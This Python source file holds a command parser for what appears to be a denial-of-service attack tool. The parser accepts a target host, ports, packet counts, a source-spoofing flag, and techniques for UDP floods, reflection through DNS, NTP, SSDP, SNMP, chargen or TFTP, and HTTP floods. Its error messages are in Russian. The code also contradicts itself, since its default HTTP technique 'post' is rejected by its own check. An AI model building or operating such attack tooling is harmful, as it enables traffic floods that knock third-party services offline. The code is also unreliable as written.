import socket

def parse_attack_command(command_str: str) -> dict:
    args = command_str.strip().split()
    params = {}

    for arg in args:
        if '=' not in arg:
            raise ValueError(f"Неверный параметр: {arg}")
        key, value = arg.split('=', 1)
        params[key.lower()] = value

    required = ['ip', 'ports', 'iter', 'count', 'method']
    for key in required:
        if key not in params:
            raise ValueError(f"Отсутствует обязательный параметр: {key}")

    method_parts = params['method'].lower().split('/')
    method = method_parts[0]
    technique = method_parts[1] if len(method_parts) > 1 else 'post' if method == 'http' else 'flood'

    if method not in ['udp', 'http']:
        raise ValueError("Метод должен быть udp или http")
    if method == "http" and technique not in ("post1", "post2", "post3", "get"):
        raise ValueError("Для HTTP допустимы только post, get, post1, post2, post3")
    if method == "udp" and technique not in ("flood", "dns", "ntp", "chargen", "ssdp", "snmp", "tftp"):
        raise ValueError("Неверная техника UDP-атаки")

    raw_target = params['ip'].strip()

    if method == "udp":
        if raw_target.startswith("http://") or raw_target.startswith("https://"):
            raw_target = raw_target.split("//", 1)[1]
        hostname = raw_target.split("/")[0]
        try:
            resolved = socket.gethostbyname(hostname)
        except socket.gaierror:
            raise ValueError(f"Не удалось разрешить домен: {hostname}")
        final_target = resolved
    else:
        final_target = raw_target

    ports = [int(p.strip()) for p in params['ports'].split(',') if p.strip().isdigit()]
    iterations = int(params['iter'])
    count = int(params['count'])
    spoof = params.get('spoof', 'N').upper() == 'Y'
    agent = params.get('agent', 'Y').upper() == 'Y'

    if not ports:
        raise ValueError("Неверный формат портов")

    return {
        'ip': final_target,
        'ports': ports,
        'iter': iterations,
        'count': count,
        'spoof': spoof,
        'agent': agent,
        'method': method,
        'technique': technique
    }


